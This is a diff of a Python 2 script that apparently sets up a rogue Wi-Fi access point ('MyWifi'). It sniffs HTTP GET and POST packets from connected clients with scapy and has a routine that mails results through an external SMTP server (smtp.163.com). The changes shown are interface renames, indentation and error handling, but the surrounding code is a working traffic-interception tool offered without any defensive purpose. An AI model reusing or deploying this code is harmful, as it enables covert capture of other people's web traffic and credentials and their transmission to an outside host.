@@ -139,33 +139,35 @@ def dealPackage(packet):
 			print line
 
 def sendMail(receiver, title, body):
-    host = 'smtp.163.com'
-    port = 25
-    sender = '****@163.com'
-    pwd = '****'
+	host = 'smtp.163.com'
+	port = 25
+	sender = '****@163.com'
+	pwd = '****'
 
-    msg = MIMEText(body, 'html')
-    msg['subject'] = title
-    msg['from'] = sender
-    msg['to'] = receiver
+	msg = MIMEText(body, 'html')
+	msg['subject'] = title
+	msg['from'] = sender
+	msg['to'] = receiver
 
-    s = smtplib.SMTP(host, port)
-    s.login(sender, pwd)
-    s.sendmail(sender, receiver, msg.as_string())
-
-    print '[*] The mail named %s to %s is sended successly.' % (title, receiver)
+	try:
+		s = smtplib.SMTP(host, port)
+		s.login(sender, pwd)
+		s.sendmail(sender, receiver, msg.as_string())
+		print '[*] The mail named %s to %s is sended successly.' % (title, receiver)
+	except Exception,e:
+		sys.exit('[x] Send email failed! Exception is %s.' % e)
 
 def dosniff():
-	sniff_iface = 'wlan1'
+	sniff_iface = 'wlan0'
 	try:
-		sniff(iface = sniff_iface,prn = dealPackage,lfilter=lambda p: "GET" in str(p) or "POST" in str(p),filter="tcp")
 		print '[√] Sniffing on '+sniff_iface+'!'
+		sniff(iface = sniff_iface,prn = dealPackage,lfilter=lambda p: "GET" in str(p) or "POST" in str(p),filter="tcp")
 	except Exception,e:
 		sys.exit('[x] Can not do sniff on %s! Please check! Exception is %s' % (sniff_iface,e))
 
 def createAP():
-	net_iface = 'wlan0'
-	ap_iface = 'wlan1'
+	net_iface = 'eth0'
+	ap_iface = 'wlan0'
 	ap_ssid = 'MyWifi'
 	ap_key = '12345678'
 	ap_getway = '192.168.0.1'
